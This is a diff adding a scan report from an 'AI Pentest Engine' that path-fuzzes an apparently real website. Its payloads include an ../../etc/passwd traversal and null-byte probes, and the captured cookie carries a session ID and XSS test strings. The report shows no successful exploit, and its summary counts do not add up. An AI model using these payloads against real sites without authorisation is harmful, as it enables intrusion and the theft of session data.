@@ -1,0 +1,131 @@
+=== AI Pentest Engine v1.0 Report ===
+Date: ۱۴۰۴/۷/۱۷, ۱۴:۵۴:۵۶
+Attack Module: Deep Path Fuzzing Probe
+Packet Source: packet.txt
+
+--- Packet Summary ---
+Method: GET
+URL: https://sinour.ir/web_editor/shape/web_editor/Floats/12.svg?c1=%2318B8FF&c2=%233984C6&c3=%23F6F6F6&c5=%23383E45
+Headers:
+  Host: sinour.ir
+  Cookie: visitor_uuid=4af9414b0f6941eb8a5075343dd4f8c9; session_id=e2456fef21f3812ea52a6512ff7405647bae50b7; frontend_lang=fa_IR; tz=Asia/Tehran; im_livechat_history=["/website/search?search=scobar&order=name+asc","/website?search=scobar%0accc&order=name+asc","/website/search?search=scobar%3C%0abbb&order=name+asc","/website/search?search=x8m5ci8t&order=name+asc","/shop?search=x8m5ci8t","/shop?search=scobar%27%0abbb%3Cb%0A%3Csvg/onload=alert(1)%3E%22%20autofocus%20onfocus=alert(1)%20x=%22%C0%BC&","/shop?commandOrParams=scobar","/shop?commandOrParams=x8m5ci8t","/shop?commandOrParams={}","/shop?commandOrParams=javascript
+  Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+  Accept-Language: en-US
+  Sec-Ch-Ua-Mobile: ?0
+  Upgrade-Insecure-Requests: 1
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
+  Sec-Ch-Ua-Platform: "Windows"
+  Sec-Fetch-Site: same-origin
+  Sec-Fetch-Mode: navigate
+  Sec-Fetch-Dest: empty
+  Accept-Encoding: gzip, deflate, br
+  Priority: u=0, i
+Body:
+  
+
+--- Requests Executed ---
+[pathfuzz-0]
+Payload: web_editor/shape/web_editor/Floats/12.svg
+Part: path
+Status Code: 200
+Response Length: 54655 bytes
+Interesting: high
+Notes: Path fuzz → Status 200, Length 54655
+
+[pathfuzz-1]
+Payload: web_editor/shape/web_editor/FLOATS/12.svg
+Part: path
+Status Code: 404
+Response Length: 68432 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68432
+
+[pathfuzz-2]
+Payload: web_editor/shape/web_editor/Icons/12.svg
+Part: path
+Status Code: 404
+Response Length: 68421 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68421
+
+[pathfuzz-3]
+Payload: web_editor/shape/web_editor/Floats/999.svg
+Part: path
+Status Code: 404
+Response Length: 68440 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68440
+
+[pathfuzz-4]
+Payload: web_editor/shape/web_editor/Floats/../../../../etc/passwd
+Part: path
+Status Code: 404
+Response Length: 68091 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68091
+
+[pathfuzz-5]
+Payload: web_editor/shape/web_editor/Floats/12.png
+Part: path
+Status Code: 404
+Response Length: 68432 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68432
+
+[pathfuzz-6]
+Payload: web_editor/shape/web_editor/Floats/12.svg%00
+Part: path
+Status Code: 400
+Response Length: 157 bytes
+Interesting: none
+Notes: Path fuzz → Status 400, Length 157
+
+[pathfuzz-7]
+Payload: web_editor/shape/web_editor/Floats/12
+Part: path
+Status Code: 404
+Response Length: 68400 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68400
+
+[pathfuzz-8]
+Payload: web_editor/shape/web_editor/Floats/12.svg?debug=true
+Part: path
+Status Code: 200
+Response Length: 54655 bytes
+Interesting: high
+Notes: Path fuzz → Status 200, Length 54655
+
+[pathfuzz-9]
+Payload: web_editor/render/web_editor/Floats/12.svg
+Part: path
+Status Code: 404
+Response Length: 68491 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68491
+
+[pathfuzz-10]
+Payload: web_editor/image/web_editor/Floats/12.svg
+Part: path
+Status Code: 404
+Response Length: 68483 bytes
+Interesting: none
+Notes: Path fuzz → Status 404, Length 68483
+
+[pathfuzz-11]
+Payload: web_editor/shape/web_editor/Floats%00/12.svg
+Part: path
+Status Code: 400
+Response Length: 157 bytes
+Interesting: none
+Notes: Path fuzz → Status 400, Length 157
+
+--- Summary ---
+Total Requests Sent: 12
+Exploited: 0
+Unpredictable: 0
+Low Impact: 0
+No Effect: 10
+
+Report saved by AI Pentest Engine v1.0.
